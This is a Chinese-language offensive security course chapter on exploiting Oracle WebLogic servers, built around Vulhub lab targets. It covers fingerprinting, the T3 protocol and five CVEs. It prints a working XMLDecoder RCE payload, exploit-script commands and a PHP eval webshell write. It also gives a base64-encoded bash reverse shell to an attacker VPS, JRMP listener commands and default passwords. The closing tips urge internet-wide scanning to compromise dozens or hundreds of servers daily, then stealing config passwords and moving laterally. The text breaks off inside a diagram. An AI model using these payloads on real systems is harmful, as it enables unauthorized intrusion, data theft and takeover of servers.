# Day 43：Weblogic 全漏洞链完全攻略（T3协议·XMLDecoder·未授权Console通杀）

> **🎯 高级专题** | 难度：⭐⭐⭐⭐ | 预计学习：150 分钟

---

# 第43章 Weblogic 全漏洞链完全攻略 🏰

## 开篇引入：那个开在 7001 端口的"金矿" 🛠️💰

哈喽各位小伙伴！欢迎来到第43章 Weblogic 完全攻略！🎉

在渗透测试/红队/护网场景里，只要你在端口扫描结果里看到：
```
PORT     STATE SERVICE
7001/tcp open  weblogic     ← 就是它！
```
**恭喜你捡到宝了！** 这个端口背后的服务器，**90%以上概率能直接getshell！** 🎉

Weblogic 是 Oracle 公司推出的**企业级Java应用服务器**（简称WLS），是金融、运营商、政府、国企等**传统行业最爱用**的中间件！特点：
- 功能"祖传"、漏洞"祖传"、而且**修复极慢** 😂
- 开在7001/7002端口，指纹明显，一抓一个准
- 漏洞类型全：反序列化、XXE、SSRF、未授权访问、JNDI注入……**中间件界的漏洞博物馆** 🏛️

**最香的几个漏洞：**
| 漏洞 | 危害 | 难度 | 我的评价 |
|-----|------|------|---------|
| CVE-2020-14882 | Console未授权+命令执行 | ⭐⭐ | **🔥 护网红队核武器！不用密码直接RCE！** |
| CVE-2019-2725 | XMLDecoder反序列化RCE | ⭐⭐ | 老版本通吃，POC一条命令打穿 |
| CVE-2020-2555 | Commons反序列化T3 RCE | ⭐⭐⭐ | 10.3.6~12.2.1.3通杀 |
| CVE-2018-2628 | JRMP反序列化RCE | ⭐⭐⭐ | T3协议经典 |
| CVE-2021-2109 | Console JNDI注入RCE | ⭐⭐ | LDAP链快速打 |

今天这一章，我们一次性搞定 Weblogic 全家桶：
1. 🔍 **指纹识别**：6种方法快速认出 WebLogic（Banner/Console/报错/XML）
2. 🔐 **T3协议揭秘**：Weblogic 私有的 RMI 协议为什么这么多洞？
3. 💥 **CVE-2020-14882 实战全流程**（重点！护网红队天天用）
4. 🧬 **CVE-2019-2725**：XMLDecoder 反序列化一条命令拿shell
5. 🧱 **CVE-2020-2555 & CVE-2018-2628**：T3反序列化全链路
6. 🪝 **CVE-2021-2109**：Console JNDI 注入（Log4j同学的老朋友）
7. 🛠️ **工具大全**：WeblogicScan、nuclei-Templates、一键Poc合集
8. 🌳 **决策树SVG**：扫描到7001之后的完整攻击流程
9. 📝 **速查表+面试问答**：护网前背一背，拿了洞再回来谢我 😎

准备好了吗？一起挖穿这个"金矿"！💎

---

## 一、Weblogic 是什么？企业中间件的"老大哥" 🏛️

### 大白话解释 🗣️
Weblogic = Oracle 出品的 **企业级 Java EE 应用服务器**。
> 大白话：相当于Tomcat的"大哥大"版，功能比Tomcat多N倍（集群、事务、EJB、JMS、高可用……），传统大型企业写的系统（银行核心、运营商计费、政府OA）基本都部署在Weblogic上。

**默认端口一览（记下来！）**
| 端口 | 服务 | 指纹特征 |
|-----|------|---------|
| **7001** ⭐ | 默认HTTP服务/Console控制台 | 必扫！ |
| 7002 | HTTPS 加密版本 | SSL版本的7001 |
| 7003 | Node Manager | 节点管理 |
| 7004 | Admin SSL | 管理端加密 |
| 8080 | 某些版本默认应用 | 次级扫描 |

**Weblogic 后台控制台地址（必收藏！）**：
```
http://目标IP:7001/console      ← 黄金入口！！
登录页面长这样：Oracle WebLogic Server Administration Console
```

---

## 二、6 种 WebLogic 指纹识别方法（快速认出它）🔍

| 编号 | 方法 | 看到什么 = 确认是Weblogic？ |
|-----|------|---------------------------|
| ① **端口+Banner** | 7001端口开着 + `nmap -sV` 扫出来 Banner 含 `WebLogic` 或 `Oracle` |
| ② **访问根目录** | `http://IP:7001/` 返回 403 或者 欢迎页面里写着 `Oracle WebLogic Server` |
| ③ **Console页面** | `http://IP:7001/console` 跳转到 `/console/login/LoginForm.jsp`，看到Oracle登录界面 ✅ |
| ④ **报错测试** | `http://IP:7001/console/.%2e/WEB-INF/web.xml` 或随便访问个不存在的路径，报错头里有 `X-Powered-By: Servlet/3.0 JSP/2.2 (WebLogic 10.3.6.0)` |
| ⑤ **XML探测** | `http://IP:7001/wls-wsat/CoordinatorPortType` → 返回SOAP XML（含"Web Services"字样）= 存在wls-wsat组件 → CVE-2019-2725大概率能打！ |
| ⑥ **T3协议握手** | 用Python发T3握手包（`t3 12.2.1\nAS:255\nHL:19\n\n`）→ 返回 `HELO:12.2.1.0.0.false` = T3协议开启 → T3反序列化漏洞可以上了！ |

**新手判断口诀（按顺序走）**：
> 先访问 `/console` 能看到登录页 → ✅ 是Weblogic → 直接上 WeblogicScan 全漏洞扫描！

---

## 三、T3 协议揭秘：Weblogic 家传漏洞之源 🕳️

### 什么是 T3 协议？
T3 是 Weblogic 自己发明的**专有通信协议**（相当于Weblogic版本的RMI），用于：
- Weblogic 服务器集群之间通信
- Java客户端（JNDI/EJB）和 Weblogic 交互

**T3 协议握手流程**：
```
Client ──── "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n" ────▶ Weblogic:7001
Client ◀──── "HELO:12.2.1.3.0.false\nAS:2048\nHL:19\n" ──── Weblogic
```
看到 `HELO:` 开头的响应 → **T3协议确定开启！** 然后就可以向T3端口发**序列化的Java对象**了。

**为什么T3漏洞多？** 
因为T3协议设计时就"充分信任客户端"——只要你能通过T3连上来，服务器就会**毫无条件地反序列化你发的任何Java对象**！再加上Weblogic自带CommonsCollections等Gadget链依赖→简直就是反序列化漏洞的"温床"！🔥

---

## 四、CVE-2020-14882：🔥 护网红队核武器！未授权+RCE！（重点讲）

### 漏洞基本信息 📋
| 项 | 值 |
|----|----|
| CVE编号 | CVE-2020-14882 + CVE-2020-14883（两个组合拳） |
| 原理 | ① Console管理后台权限绕过（14882）→ ② 调用 Gadget 执行命令（14883） |
| **影响版本** | Weblogic 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0 **（几乎覆盖所有主流版本！）** |
| 前置条件 | 能访问 `7001/console` 即可（不需要账号密码！✅） |
| CVSS 评分 | 9.8（Critical 严重） |
| **实战地位** | ⭐⭐⭐⭐⭐ 护网中拿shell最多的Weblogic漏洞！没有之一！ |

---

### 漏洞原理（新手看图说话）📖

#### 第①拳 CVE-2020-14882：权限绕过（不用密码进后台！）🚪
正常访问后台需要账号密码：
```
GET /console/login/LoginForm.jsp  →  跳到登录页
```

但是！Weblogic 的权限校验过滤器（AuthenticationFilter）有个漏洞：**如果你访问的URL路径里带有 `console/css/%2e%2e%2fconsole` 这种编码过的 `../`，过滤器会放行不校验！**

```
GET /console/css/%2e%2e%2fconsole.portal?_nfpb=true&_pageLabel=HomePage1
```
→ `%2e%2e%2f` 解码后是 `../` → 实际路径是 `/console/css/../console.portal` → 等于 `/console/console.portal`
→ **过滤器以为你在访问css静态资源**（放行✅）→ 实际你访问的是管理控制台主页面！🪄

#### 第②拳 CVE-2020-14883：后台 Gadget RCE（执行命令！）💥
进到后台以后，Weblogic Console 自己有两个"代码执行后门"一般的类：
- `com.tangosol.coherence.mvel2.sh.ShellSession`（12c版本用，MVEL表达式执行）
- `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`（10.3.6老版本用，XML配置加载）

只要通过Console后台提交这两个类的 Gadget → Weblogic 直接加载执行！**Runtime.getRuntime().exec("whoami")** 信手拈来！

---

### CVE-2020-14882 原理+攻击流程图

<svg width="820" height="430" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="wlbg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#fff7ed"/>
      <stop offset="100%" stop-color="#fef9c3"/>
    </linearGradient>
    <marker id="arrW" markerWidth="11" markerHeight="9" refX="10" refY="5" orient="auto"><polygon points="0 0,11 5,0 10" fill="#c2410c"/></marker>
  </defs>
  <rect width="820" height="430" rx="16" fill="url(#wlbg)"/>
  <text x="410" y="30" text-anchor="middle" fill="#9a3412" font-weight="bold" font-size="20">💥 CVE-2020-14882 + 14883 Weblogic 核武器攻击链路</text>
  <!-- 左侧 攻击者 -->
  <g transform="translate(30,60)"><rect x="0" y="0" width="200" height="90" rx="14" fill="#fff" stroke="#c2410c" stroke-width="2"/>
    <text x="100" y="25" text-anchor="middle" fill="#9a3412" font-weight="bold" font-size="15">😈 攻击者浏览器 / Burp</text>
    <g transform="translate(10,35)"><rect x="0" y="0" width="180" height="22" rx="5" fill="#ffedd5"/>
      <text x="90" y="15" text-anchor="middle" font-size="10" fill="#7c2d12">① 构造编码 URL 绕过权限</text>
    </g>
    <g transform="translate(10,60)"><rect x="0" y="0" width="180" height="22" rx="5" fill="#fed7aa"/>
      <text x="90" y="15" text-anchor="middle" font-size="10" fill="#7c2d12">② POST 注入 Gadget 执行命令</text>
    </g>
  </g>
  <!-- 箭头 -->
  <line x1="230" y1="90" x2="310" y2="115" stroke="#c2410c" stroke-width="2.5" marker-end="url(#arrW)"/>
  <text x="245" y="100" fill="#c2410c" font-weight="bold" font-size="10">HTTP 请求 7001/console</text>
  <!-- 中间 Weblogic 分层 -->
  <g transform="translate(310,60)"><rect x="0" y="0" width="260" height="330" rx="14" fill="#fff" stroke="#1d4ed8" stroke-width="2"/>
    <text x="130" y="25" text-anchor="middle" fill="#1e3a8a" font-weight="bold" font-size="15">🏰 Weblogic 7001 处理流程</text>
    <!-- 层1 过滤器 -->
    <g transform="translate(10,40)"><rect x="0" y="0" width="240" height="52" rx="10" fill="#dbeafe" stroke="#1d4ed8" stroke-width="1"/>
      <text x="120" y="18" text-anchor="middle" fill="#1e40af" font-weight="bold" font-size="12">🛡️ ① AuthenticationFilter（权限校验）</text>
      <g transform="translate(8,24)"><rect x="0" y="0" width="224" height="20" rx="5" fill="#bfdbfe"/>
        <text x="112" y="14" text-anchor="middle" font-family="Consolas" font-size="9">URL含 "console/css/%2e%2e" → 误判成静态CSS</text>
      </g>
      <g transform="translate(8,46)"><rect x="0" y="0" width="224" height="4" rx="2" fill="#16a34a"/>
        <text x="112" y="6" text-anchor="middle" fill="#166534" font-size="8" font-weight="bold">权限校验被绕过 ✅</text>
      </g>
    </g>
    <!-- 层2 Console Servlet -->
    <g transform="translate(10,102)"><rect x="0" y="0" width="240" height="52" rx="10" fill="#ddd6fe" stroke="#6d28d9" stroke-width="1"/>
      <text x="120" y="18" text-anchor="middle" fill="#5b21b6" font-weight="bold" font-size="12">📋 ② ConsoleServlet 处理请求</text>
      <g transform="translate(8,24)"><rect x="0" y="0" width="224" height="20" rx="5" fill="#c4b5fd"/>
        <text x="112" y="14" text-anchor="middle" font-size="9" fill="#4c1d95">实际路径 = /console/console.portal （管理员后台）</text>
      </g>
      <g transform="translate(8,46)"><rect x="0" y="0" width="224" height="4" rx="2" fill="#16a34a"/>
        <text x="112" y="6" text-anchor="middle" fill="#166534" font-size="8" font-weight="bold">已登录（管理员权限）✅</text>
      </g>
    </g>
    <!-- 层3 Gadget加载 -->
    <g transform="translate(10,164)"><rect x="0" y="0" width="240" height="52" rx="10" fill="#fecaca" stroke="#dc2626" stroke-width="2"/>
      <text x="120" y="18" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="12">🧨 ③ Gadget 反序列化 / XML加载</text>
      <g transform="translate(8,24)"><rect x="0" y="0" width="224" height="20" rx="5" fill="#fca5a5"/>
        <text x="112" y="14" text-anchor="middle" font-size="9" fill="#7f1d1d">ShellSession.execute() / FSXAC加载恶意XML</text>
      </g>
      <g transform="translate(8,46)"><rect x="0" y="0" width="224" height="4" rx="2" fill="#dc2626"/>
        <text x="112" y="6" text-anchor="middle" fill="#fff" font-size="8" font-weight="bold">命令执行链路触发！</text>
      </g>
    </g>
    <!-- 层4 RCE -->
    <g transform="translate(10,226)"><rect x="0" y="0" width="240" height="52" rx="10" fill="#7f1d1d" stroke="#991b1b" stroke-width="3"/>
      <text x="120" y="18" text-anchor="middle" fill="#fff" font-weight="bold" font-size="13">💀 ④ Runtime.exec() RCE 成功！</text>
      <g transform="translate(8,24)"><rect x="0" y="0" width="224" height="20" rx="5" fill="#111"/>
        <text x="112" y="14" text-anchor="middle" font-family="Consolas" font-size="10" fill="#22c55e">$ whoami → root</text>
      </g>
    </g>
  </g>
  <!-- 右侧 结果 -->
  <line x1="570" y1="265" x2="630" y2="240" stroke="#dc2626" stroke-width="3" marker-end="url(#arrW)"/>
  <text x="580" y="248" fill="#7f1d1d" font-weight="bold" font-size="10">⑤ 命令回显 / 反弹Shell</text>
  <g transform="translate(580,160)"><rect x="0" y="0" width="210" height="100" rx="14" fill="#fff" stroke="#dc2626" stroke-width="3"/>
    <text x="105" y="22" text-anchor="middle" fill="#7f1d1b" font-weight="bold" font-size="13">🎯 最终战果</text>
    <g transform="translate(8,30)"><rect x="0" y="0" width="194" height="18" rx="5" fill="#fee2e2"/>
      <text x="97" y="13" text-anchor="middle" font-size="10" fill="#7f1d1d">✅ 无需账号密码</text>
    </g>
    <g transform="translate(8,50)"><rect x="0" y="0" width="194" height="18" rx="5" fill="#fee2e2"/>
      <text x="97" y="13" text-anchor="middle" font-size="10" fill="#7f1d1d">✅ 10.3.6~14.1.1 全覆盖</text>
    </g>
    <g transform="translate(8,70)"><rect x="0" y="0" width="194" height="22" rx="5" fill="#dc2626"/>
      <text x="97" y="15" text-anchor="middle" font-size="11" fill="#fff" font-weight="bold">💥 远程命令执行 (RCE)</text>
    </g>
  </g>
  <!-- 底部总结 -->
  <g transform="translate(100,390)"><rect x="0" y="0" width="620" height="30" rx="12" fill="#111827"/>
    <text x="310" y="20" text-anchor="middle" fill="#fbbf24" font-weight="bold" font-size="13">⭐ 新手结论：扫到7001 → 先扔 14882 POC！能成的概率 70% 以上！</text>
  </g>
</svg>

---

### CVE-2020-14882 实战操作 🛠️

#### 第一步：Vulhub 起靶机
```bash
cd /root/vulhub/weblogic/CVE-2020-14882
docker-compose up -d
# 等待3~5分钟启动，访问 http://IP:7001/console 看到登录界面
```

#### 第二步：找现成 POC（GitHub 一搜一大把，推荐这个成熟的）
```bash
git clone https://github.com/zhzyker/exphub.git
cd exphub/weblogic/CVE-2020-14882/
```

#### 第三步：一键打 RCE（命令执行版）
```bash
# 12c 版本（12.2.1.x / 14c）用这个：
python3 CVE-2020-14882.py -u http://目标IP:7001 -c "whoami"
# → 会回显 root 就是成功！

# 10.3.6 老版本用这个（XML版本）：
python3 CVE-2020-14882_xml.py -u http://目标IP:7001 -c "uname -a"
```

#### 第四步：写一句话木马 / 反弹Shell
```bash
# 方法A：直接echo写Webshell到发布目录
python3 CVE-2020-14882.py -u http://IP:7001 -c 'echo "<?php @eval(\$_POST[1]);?>" > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/000000/shell.php'
# 然后访问 http://IP:7001/bea_wls_internal/shell.php （密码1）→ 中国菜刀连上！🪓

# 方法B：bash反弹Shell（用bash -i 方式）
python3 CVE-2020-14882.py -u http://IP:7001 \
  -c 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ZUVS5JUDo3Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}'
# VPS先开 nc -lvvp 7777 接着就行！🎉
```

---

## 五、CVE-2019-2725：XMLDecoder 反序列化一条命令拿Shell 🧬

### 漏洞基本信息 📋
| 项 | 值 |
|----|----|
| CVE | CVE-2019-2725（CNVD-C-2019-48814 国内先爆的，也叫"48814"）|
| 原理 | wls-wsat 组件的 XMLDecoder 解析用户提交的XML → 直接执行任意Java代码（XML里写new ProcessBuilder()）|
| 影响版本 | Weblogic 10.3.6.0 / 12.1.3.0 |
| 指纹特征 | 访问 `http://IP:7001/wls-wsat/CoordinatorPortType` 返回XML（含 `wsat`）= 该组件开启，可以打 ✅ |
| 难度 | ⭐⭐（POC直接跑，不用依赖） |

### 关键 Payload 构造（XMLDecoder 语法）
```xml
<!-- 核心：XML里直接写 Java代码！XMLDecoder会帮你"翻译"并执行！ -->
<soapenv:Envelope>
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">  <!-- 构造 ProcessBuilder 对象 -->
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>touch /tmp/weblogic_pwned</string></void>
          </array>
          <void method="start"/>   <!-- 调用 start() 启动进程！💥 -->
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
</soapenv:Envelope>
```
→ 把这个XML POST 到 `/wls-wsat/CoordinatorPortType` ，命令就执行了！

### 一键打：
```bash
# vulhub 里的靶机
cd /root/vulhub/weblogic/CVE-2019-2725
python3 weblogic-2725.py -u http://目标IP:7001 -c "whoami"
# 回显 "root" → 成功！
```

---

## 六、CVE-2020-2555 & CVE-2018-2628：T3 反序列化 🔄

### CVE-2020-2555（重点！新版 T3 RCE）📋
| 项 | 值 |
|----|----|
| CVE | CVE-2020-2555 |
| 原理 | Weblogic 自带了一个 **修改过的 Commons Collections 库**（叫 `com.tangosol.coherence`），ysoserial 有对应的链 |
| 影响版本 | 10.3.6.0 / 12.1.3.0 / 12.2.1.3 / 12.2.1.4（又一个全覆盖！）|
| 前置条件 | 能连T3协议（默认开）|

### CVE-2018-2628（经典 JRMP T3 RCE）📋
| 项 | 值 |
|----|----|
| CVE | CVE-2018-2628 |
| 原理 | Weblogic T3协议反序列化时，处理 `java.rmi.registry.Registry` 触发 JRMPClient → 去攻击机JRMP端口拿恶意对象执行 |
| 影响版本 | 10.3.6.0 / 12.1.3.0 / 12.2.1.2 / 12.2.1.3 |
| 前置条件 | 目标出网（能访问你VPS的JRMP监听端口）|

### T3 漏洞实战三步法
```bash
# ① 开 JRMP 监听（2628 用这个）
java -cp ysoserial-0.0.6-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections5 "touch /tmp/t3_pwned" &

# ② 发 T3 反序列化 Payload 给 7001
python3 weblogic_t3_exploit.py -t 目标IP -p 7001 --JRMP VPS_IP:9999 --gadget JRMP

# ③ 验证
docker exec -it 容器ID ls /tmp/
# 看到 t3_pwned → 成功！🎉
```

---

## 七、CVE-2021-2109：Console JNDI 注入（Log4j同学的老朋友！🪝）

### 基本信息
| 项 | 值 |
|----|----|
| CVE | CVE-2021-2109 |
| 原理 | Console 的 `LDAPServer` MBean 允许未授权用户构造 JNDI LDAP 请求 → 经典JNDI注入，配合 marsha1sec/marshalsec 的 LDAPRefServer 打RCE |
| 影响版本 | 10.3.6.0 / 12.1.3.0 / 12.2.1.3 / 12.2.1.4 / 14.1.1.0（又是全家桶！） |
| 前置条件 | 目标出网 + 能访问console（又一次！不用账号密码！）|
| 难度 | ⭐⭐（Log4j那套环境直接复用！）|

**流程**：你VPS起marshalsec LDAP服务（1389端口）+ HTTP（8888）→ 发个POST请求给console/JNDITree → Weblogic发起JNDI请求到你VPS → 加载远程恶意类 → RCE！（和我们Day42 Log4j打LDAP链一模一样，换个POC就行！）

---

## 八、Weblogic 攻击决策树（实战照着走！🌳）

<svg width="820" height="460" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="wtbg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#f0f9ff"/>
      <stop offset="100%" stop-color="#eff6ff"/>
    </linearGradient>
    <marker id="arrWW" markerWidth="10" markerHeight="8" refX="9" refY="4" orient="auto"><polygon points="0 0,10 4,0 8" fill="#1d4ed8"/></marker>
  </defs>
  <rect width="820" height="460" rx="16" fill="url(#wtbg)"/>
  <text x="410" y="30" text-anchor="middle" fill="#1e3a8a" font-weight="bold" font-size="20">🌳 Weblogic（7001端口）实战攻击决策树</text>
  <!-- 开始 -->
  <g transform="translate(300,48)"><rect x="0" y="0" width="220" height="50" rx="12" fill="#1d4ed8"/>
    <text x="110" y="22" text-anchor="middle" fill="#fff" font-weight="bold" font-size="15">🎯 发现 7001 端口</text>
    <text x="110" y="42" text-anchor="middle" fill="#bfdbfe" font-size="11">→ 先访问 http://IP:7001/console 看登录页</text>
  </g>
  <!-- 决策1 -->
  <line x1="410" y1="98" x2="410" y2="125" stroke="#1d4ed8" stroke-width="2.5" marker-end="url(#arrWW)"/>
  <g transform="translate(300,125)"><polygon points="110,0 220,40 110,80 0,40" fill="#fde68a" stroke="#b45309" stroke-width="2"/>
    <text x="110" y="35" text-anchor="middle" fill="#78350f" font-weight="bold" font-size="13">第一步：先上</text>
    <text x="110" y="55" text-anchor="middle" fill="#78350f" font-weight="bold" font-size="13">WeblogicScan 一扫全漏？</text>
  </g>
  <!-- 左 Yes 直接打14882 -->
  <line x1="300" y1="165" x2="100" y2="215" stroke="#16a34a" stroke-width="2.5" marker-end="url(#arrWW)"/>
  <text x="185" y="182" fill="#166534" font-weight="bold" font-size="11">✅ 扫到14882</text>
  <g transform="translate(20,215)"><rect x="0" y="0" width="180" height="60" rx="12" fill="#dcfce7" stroke="#16a34a" stroke-width="2"/>
    <text x="90" y="22" text-anchor="middle" fill="#14532d" font-weight="bold" font-size="14">🚀 CVE-2020-14882</text>
    <text x="90" y="42" text-anchor="middle" font-size="11">POC 一键打 → 70% 概率成</text>
    <text x="90" y="58" text-anchor="middle" font-size="11" fill="#166534" font-weight="bold">（无需账号密码！）</text>
  </g>
  <!-- 中下 扫到2725/2555 -->
  <line x1="410" y1="205" x2="410" y2="235" stroke="#0284c7" stroke-width="2.5" marker-end="url(#arrWW)"/>
  <text x="440" y="222" fill="#075985" font-weight="bold" font-size="11">✔ 扫到其他漏洞</text>
  <g transform="translate(290,235)"><rect x="0" y="0" width="240" height="130" rx="12" fill="#fff" stroke="#0284c7" stroke-width="2"/>
    <text x="120" y="25" text-anchor="middle" fill="#075985" font-weight="bold" font-size="14">🛠️ 按漏洞类型逐个上！</text>
    <!-- 2725 -->
    <g transform="translate(10,35)"><rect x="0" y="0" width="220" height="26" rx="6" fill="#cffafe" stroke="#0284c7"/>
      <text x="110" y="12" text-anchor="middle" font-weight="bold" font-size="11">🧬 CVE-2019-2725 （先访问/wls-wsat判断）</text>
      <text x="110" y="24" text-anchor="middle" font-family="Consolas" font-size="9">POST XML → /wls-wsat/CoordinatorPortType</text>
    </g>
    <!-- 2555 -->
    <g transform="translate(10,66)"><rect x="0" y="0" width="220" height="26" rx="6" fill="#cffafe" stroke="#0284c7"/>
      <text x="110" y="12" text-anchor="middle" font-weight="bold" font-size="11">🧱 CVE-2020-2555 （T3 Coherence CC链）</text>
      <text x="110" y="24" text-anchor="middle" font-family="Consolas" font-size="9">ysoserial CoherencePayload → T3 7001</text>
    </g>
    <!-- 2628 + 2109 -->
    <g transform="translate(10,97)"><rect x="0" y="0" width="220" height="26" rx="6" fill="#cffafe" stroke="#0284c7"/>
      <text x="110" y="12" text-anchor="middle" font-weight="bold" font-size="11">🔗 CVE-2018-2628 + CVE-2021-2109</text>
      <text x="110" y="24" text-anchor="middle" font-family="Consolas" font-size="9">JRMP 监听 / JNDI LDAP 出网打</text>
    </g>
  </g>
  <!-- 右 扫不出漏洞 -->
  <line x1="520" y1="165" x2="720" y2="215" stroke="#9333ea" stroke-width="2.5" marker-end="url(#arrWW)"/>
  <text x="620" y="188" fill="#6b21a8" font-weight="bold" font-size="11">❌ 自动扫描没中</text>
  <g transform="translate(610,215)"><rect x="0" y="0" width="180" height="60" rx="12" fill="#faf5ff" stroke="#9333ea" stroke-width="2"/>
    <text x="90" y="22" text-anchor="middle" fill="#6b21a8" font-weight="bold" font-size="13">🔐 试弱口令爆破！</text>
    <text x="90" y="42" text-anchor="middle" font-size="11">weblogic / Oracle@123</text>
    <text x="90" y="58" text-anchor="middle" font-size="11" fill="#6b21a8" font-weight="bold">Portal@123 / system/xxxx</text>
  </g>
  <!-- 底部：进入后台之后 -->
  <g transform="translate(120,382)"><rect x="0" y="0" width="580" height="68" rx="14" fill="#111827"/>
    <text x="290" y="20" text-anchor="middle" fill="#fbbf24" font-weight="bold" font-size="14">🎁 无论哪种方式，只要拿到后台权限（或RCE）之后 → 下一步：</text>
    <text x="290" y="42" text-anchor="middle" fill="#e5e7eb" font-size="11">① 部署 WAR 包拿持久化Shell → ② 找config.xml里的数据库/JMS明文密码 → ③ 内网横向拿其他机器！</text>
    <text x="290" y="62" text-anchor="middle" fill="#10b981" font-size="12" font-weight="bold">Weblogic = 内网横向的"跳板机器"首选！权限高 + 密码多</text>
  </g>
</svg>

---

## 九、工具大全 🛠️

| 工具 | 用途 | 使用场景 |
|-----|------|---------|
| **WeblogicScan** | 全漏洞批量扫描（20+POC集成） | 扫到7001 → 直接扔进去跑，扫到哪个打哪个 |
| 使用 | `python3 WeblogicScan.py -u http://IP:7001` | 新手首选！ |
| **exphub / CVE-2020-14882 POC** | 14882 单独RCE工具 | 单独打14882（成功率最高的那个）|
| 使用 | `python3 CVE-2020-14882.py -u URL -c 命令` |  |
| **nuclei-templates** | nuclei扫Weblogic全套 | 批量资产时：`nuclei -l urls.txt -tags weblogic` |
| **ysoserial + JRMPListener** | T3 反序列化（2555/2628） | 手动打T3漏洞 |
| **marshalsec LDAPRefServer** | CVE-2021-2109 JNDI | 和Log4j复用同一套环境 |

---

## 十、速查表+面试问答 📋

### 面试问答 ⏰

| 问题 | 标准答案 |
|-----|---------|
| WebLogic 默认端口？ | HTTP:7001 HTTPS:7002 后台 /console |
| 最容易打的Weblogic漏洞？ | CVE-2020-14882（无需账号密码，版本覆盖全）|
| 14882 权限绕过原理？ | URL编码 `%2e%2e` 绕过 AuthenticationFilter 静态资源放行规则 |
| 2725 漏洞原理？ | wls-wsat 组件的 XMLDecoder 解析用户XML → 执行Java代码（XML里写ProcessBuilder）|
| T3协议和反序列化关系？ | T3是Weblogic私有RMI协议，默认无条件反序列化客户端对象 → 配合CC/CB链RCE |
| Weblogic进后台之后做什么？ | ① 部署war包拿shell ② 读config.xml拿里面的明文数据库密码 ③ 内网横向 |
| 找到config.xml里的AES加密密码怎么办？ | 用 WeblogicDecrypt 工具 + 目标里的 SerializedSystemIni.dat 可以解密回明文！ |

---

## 本章总结 📝

Weblogic 是**传统行业（金融/政府/运营商）渗透的第一突破口**！

### 核心知识：
1. **指纹识别**：7001/console 登录页 = Weblogic；`/wls-wsat/...` 返回XML = 2725可打；Banner含 HELO = T3开启
2. **头号漏洞 CVE-2020-14882**：编码URL绕过权限 + Gadget命令执行 → 7001端口开着就先试这个！
3. **CVE-2019-2725**：wls-wsat组件XMLDecoder → 直接写XML POST命令执行
4. **T3 反序列化**：2628（JRMP）、2555（Coherence CC链）→ ysoserial + JRMPListener
5. **2109 JNDI**：和Log4j的LDAP链一套工具链复用
6. **决策树**：7001 → WeblogicScan扫 → 14882先打 → 2725/2555 → 弱口令 → 读config.xml拿密码内网横向

下一章是我们方案B的**倒数第二天**！**Day44 综合靶场实战方法论（信息收集→漏洞探测→组合利用→提权→内网横向）**——把我们这40多天学的SQLi、XSS、RCE、SSRF、XXE、Shiro、Fastjson、Log4j、Weblogic所有技能串起来打一场"完整的入侵模拟"！真正的毕业大戏，不见不散！🎬

---

> 💡 新手 Tip：
> 1. 护网/红队期间，用masscan全网扫 7001 → 拿结果批量跑 WeblogicScan → **一天拿几十上百台服务器不是梦**！
> 2. WebLogic 启动慢（3~5分钟），Docker起靶后别急着打，能访问登录页了再上
> 3. 14882 POC有Python、Java两种版本，如果某个版本没反应换另一个，有可能目标环境对某一种Payload兼容不好

---

# 🖼️ 本章拓展图解汇总（day-43 · 共20张SVG架构图）


<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="ggzow3lx9" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#ggzow3lx9)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7f1d1d" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🏰 Weblogic 企业级中间件全景</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Oracle Fusion Middleware旗舰JavaEE容器</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">支持EJB/JMS/Servlet/JSP/T3/IIOP协议</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">版本: 10.3.6/12.1.3/12.2.1.3/12.2.1.4/14.1.1</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">默认端口 7001/7002/5556/7003/8453</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">企业应用占有率: 金融/政府/运营商 极高</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gzuia8vp3" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gzuia8vp3)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#991b1b" opacity="0.88"/>
